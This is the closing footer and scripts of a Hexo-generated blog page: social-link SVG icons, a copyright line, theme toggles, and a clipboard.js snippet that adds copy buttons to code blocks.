  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
</svg>
          </a>
        
      
        
          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
</svg>
          </a>
        
      
    </div>
     
    <p>&copy; 2023 <a href="/" target="_blank">1llustrious</a></p>

    

    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>

    <p>
      <a href="javascript:;" id="theme-light">ğŸŒ æµ…è‰²</a>
      <a href="javascript:;" id="theme-dark">ğŸŒ› æ·±è‰²</a>
      <a href="javascript:;" id="theme-auto">ğŸ¤–ï¸ è‡ªåŠ¨</a>
    </p>
  </div>
</footer>
  </div>

  <div class="back-to-top-fixed soft-size--round soft-style--box">
    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
    </svg>
  </div>

  
  <!-- aplayer -->


<!-- dplayer -->


<!-- copy button  -->
<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

<!-- https://clipboardjs.com/ -->


<script type="text/javascript">
	(function () {
		function getCodeType (elem) {
			const classs = Array.from(elem.classList.values());
			if (classs && classs.length > 1) {
				return classs[1];
			}
			return "plain";
		}

		window.addEventListener("DOMContentLoaded", () => {
			const copyBtnClass = "copy-btn";
			//  instantiate clipboardjs 
			const clipboard = new ClipboardJS('.' + copyBtnClass);

			clipboard.on('success', function (e) {
				console.info('Action:', e.action);
				console.info('Text:', e.text);
				console.info('Trigger:', e.trigger);
				if (e.trigger) {
					e.trigger.classList.add("copied");
					setTimeout(() => {
						e.trigger.classList.remove("copied");
					}, 3000);
				}
				e.clearSelection();
			});

			clipboard.on('error', function (e) {
				console.error('Action:', e.action);
				console.error('Trigger:', e.trigger);
			});

			document.querySelectorAll('figure.highlight').forEach((elem) => {
				const codeContent = elem.querySelector("td.code");
				const copyButton = document.createElement('button');
				copyButton.setAttribute("class", copyBtnClass);
				copyButton.setAttribute("title", "Copy Code");
				copyButton.setAttribute("data-clipboard-text", codeContent.innerText);
				elem.insertBefore(copyButton, elem.children[0]);
			});
		})
	})();
</script>








  


  


  




<script src="/js/script.js"></script>


  
  <!-- å°¾éƒ¨ç”¨æˆ·è‡ªå®šä¹‰ç›¸å…³å†…å®¹ -->
</body>
</html>
